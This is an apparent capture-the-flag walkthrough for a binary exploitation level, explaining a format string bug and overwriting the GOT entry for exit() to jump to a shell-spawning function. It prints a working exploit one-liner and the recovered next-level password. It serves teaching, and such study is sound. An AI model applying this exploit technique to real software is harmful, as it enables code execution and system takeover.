# Level 5: Format String Exploitation - Redirecting Execution Flow

## Challenge Overview

Level5 introduces a new challenge: we need to redirect program execution to an unreachable function that contains a shell execution.

## Source Code Analysis

Using Ghidra, we extracted the source code of the binary:

```c
#include <stdio.h>
#include <stdlib.h>

void n(void);
void o(void);

void main(void)
{
    n();
    return;
}

void n(void)
{
    char buffer[520];

    fgets(buffer, 0x200, stdin);
    printf(buffer);
    exit(1);
}

void o(void)
{
    system("/bin/sh");
    _exit(1);
}
```

## The Vulnerability

The vulnerability is in the `n()` function which directly passes user input to `printf()` without format specifiers. This creates a format string vulnerability that allows us to read from and write to memory.

## The Challenge

Looking at the code, we can identify:

1. The `n()` function reads input, passes it to `printf()`, then calls `exit(1)`
2. The `o()` function would give us a shell with `system("/bin/sh")`, but is never called in the normal program flow
3. Since `n()` calls `exit(1)` and not `return`, we can't use a traditional buffer overflow to redirect execution

## Key Memory Addresses

Using gdb, we identified the following address:

- Function `o()` address: `0x080484a4` (address of its first instruction)

```bash
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
```

- Function `exit()` address: `0x8049838` (address of the jump instruction in the GOT)

```bash
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
```

We determine the GOT entry for `exit()` by examining its PLT entry - the `jmp *0x8049838` instruction shows that the program is jumping to the address stored at 0x8049838, which is the GOT entry containing the actual address of the `exit()` function.

## The Exploitation Strategy

Since we can't overflow the buffer to change a return address (there isn't one), we need a different approach. The key insight is that we can overwrite the GOT (Global Offset Table) entry for `exit()` to redirect execution.

### Understanding GOT

The Global Offset Table (GOT) is a critical part of dynamically linked executables:

- It contains memory addresses of functions loaded from external libraries (like libc)
- When a program calls an external function like `exit()`, it uses the address stored in the GOT
- These addresses are stored in a writable memory section, making them targets for exploitation

By overwriting the GOT entry for `exit()`, we can make it point to `o()` instead of the real `exit()` function, effectively hijacking the program's execution flow.

### Format String Attack Approach

We'll use the format string vulnerability to:

1. Place the GOT address of `exit()` at the beginning of our input
2. Use the direct parameter access feature to make printf write to that address
3. Write the address of function `o()` (0x080484a4) to the GOT entry

### 1. Determine Parameter Positions

To find where our address is positioned in the printf parameter list, we run:

```bash
(python -c 'print "\x38\x98\x04\x08" + "%p %p %p %p"') | ./level5
0x200 0xb7fd1ac0 0xb7ff37d0 0x8049838
```

This shows our target address (0x8049838) is at position 4.

### 2. The Complete Exploit


```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824c%4$n"'; cat) | ./level5
```

This command:

1. Places the address (0x08049838) at the beginning of the input
2. Uses `%134513824c` to print exactly 134,513,824 characters (decimal for 0x080484a4)
3. The `%4$n` writes this count to the 4th argument, which is our GOT entry
4. Keeps stdin open with `cat` so we can interact with the shell once it spawns. Check level1's walkthrough for more details.

When the exploit runs, the program will call `exit(1)`, but instead of jumping to the real `exit()` function, it will jump to our `o()` function, which gives us a shell.

With the shell, we can read the password for level6:

```
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Observations About \_exit() vs exit()

An interesting detail is that `o()` uses `_exit(1)` instead of `exit(1)`. This is important because:

1. If `o()` had used `exit(1)`, we would create an infinite loop when the GOT entry is overwritten
2. Since `_exit()` is a different function with its own GOT entry, we avoid this problem
3. This allows our exploit to cleanly execute the shell and then terminate
